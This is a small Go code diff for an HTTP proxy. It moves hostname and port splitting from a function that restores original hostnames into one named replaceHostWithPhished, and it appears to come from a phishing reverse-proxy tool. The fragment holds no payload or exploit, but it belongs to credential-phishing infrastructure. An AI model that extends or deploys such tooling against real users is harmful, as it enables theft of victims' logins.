@@ -1258,12 +1258,6 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		return hostname, false
 	}
 	prefix := ""
-	port := ""
-	if strings.Contains(hostname, ":") {
-		s := strings.Split(hostname, ":")
-		hostname = s[0]
-		port = s[1]
-	}
 	if hostname[0] == '.' {
 		prefix = "."
 		hostname = hostname[1:]
@@ -1289,6 +1283,12 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		return hostname, false
 	}
 	prefix := ""
+	port := ""
+	if strings.Contains(hostname, ":") {
+		s := strings.Split(hostname, ":")
+		hostname = s[0]
+		port = s[1]
+	}
 	if hostname[0] == '.' {
 		prefix = "."
 		hostname = hostname[1:]
